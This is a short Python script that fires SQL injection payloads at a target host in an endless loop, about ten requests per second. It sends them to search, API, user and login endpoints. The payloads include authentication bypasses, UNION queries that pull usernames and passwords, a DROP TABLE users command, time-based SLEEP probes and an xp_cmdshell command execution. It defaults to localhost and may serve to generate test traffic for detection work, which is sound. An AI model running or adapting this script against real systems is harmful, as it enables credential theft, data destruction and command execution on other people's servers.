#!/usr/bin/env python3
"""SQL Injection attempts — шлёт запросы с SQLi пейлоадами."""
import sys, requests, time, random

target = sys.argv[1] if len(sys.argv) > 1 else "localhost"

PAYLOADS = [
    "' OR '1'='1",
    "' OR 1=1--",
    "' UNION SELECT null,null,null--",
    "admin'--",
    "' DROP TABLE users--",
    "1; SELECT * FROM users",
    "' OR 'x'='x",
    "') OR ('1'='1",
    "1' AND SLEEP(3)--",
    "' OR 1=1#",
    "' UNION SELECT username,password FROM users--",
    "1 UNION ALL SELECT NULL,NULL,NULL--",
    "'; EXEC xp_cmdshell('whoami')--",
    "admin' /*",
    "1 AND (SELECT * FROM (SELECT(SLEEP(3)))a)--",
]

ENDPOINTS = [
    f"http://{target}/search?q=",
    f"http://{target}/api/data?id=",
    f"http://{target}/login",
    f"http://{target}/user?name=",
]

print(f"[sqli] → {target}")
while True:
    endpoint = random.choice(ENDPOINTS)
    payload  = random.choice(PAYLOADS)

    try:
        if "/login" in endpoint:
            requests.post(endpoint,
                          data={"username": payload, "password": "pass"},
                          timeout=2, allow_redirects=False)
        else:
            requests.get(endpoint + requests.utils.quote(payload),
                         timeout=2)
    except Exception:
        pass
    time.sleep(0.1)   # 10 req/s
